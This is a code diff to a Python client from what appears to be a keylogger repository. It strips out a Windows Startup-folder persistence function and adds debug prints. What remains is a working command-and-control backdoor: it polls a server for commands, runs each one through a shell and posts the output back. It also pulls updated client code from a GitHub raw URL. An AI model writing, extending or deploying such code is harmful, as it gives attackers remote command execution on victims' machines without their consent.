@@ -9,14 +9,6 @@ SERVER_URL = 'http://192.168.15.16:5000'  # Server IP
 GITHUB_URL = 'https://raw.githubusercontent.com/JJcoded/keylogger-repo/refs/heads/main/client.py'
 LOCAL_PATH = os.path.abspath(__file__)
 
-def add_to_startup():
-    # Windows startup path
-    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-    # Copy script to startup if not already there
-    if not os.path.exists(os.path.join(startup_path, os.path.basename(LOCAL_PATH))):
-        with open(os.path.join(startup_path, os.path.basename(LOCAL_PATH)), 'wb') as f:
-            f.write(open(LOCAL_PATH, 'rb').read())
-
 def check_for_updates():
     try:
         response = requests.get(GITHUB_URL)
@@ -35,18 +27,19 @@ def communicate_with_server():
     try:
         req = requests.get(SERVER_URL, timeout=5)
         c2_command = req.text
+        print(f'[Client] Received command: {c2_command}')  # For debugging purposes
         if 'terminate' in c2_command:
+            print('[Client] Terminate command received. Exiting...')
             sys.exit()
         else:
             CMD = subprocess.Popen(c2_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            requests.post(SERVER_URL, data=CMD.stdout.read())
+            response = CMD.stdout.read()
+            print(f'[Client] Sending response: {response.decode()}')  # For debugging purposes
+            requests.post(SERVER_URL, data=response)
     except (requests.ConnectionError, requests.Timeout):
-        print("Server down. Reconnecting...")
+        print("[Client] Server not available. Reconnecting...")
 
 if __name__ == "__main__":
-    # Add to startup if not already added
-    add_to_startup()
-    
     # Continuous loop for checking server and updating
     while True:
         # Check for updates on GitHub
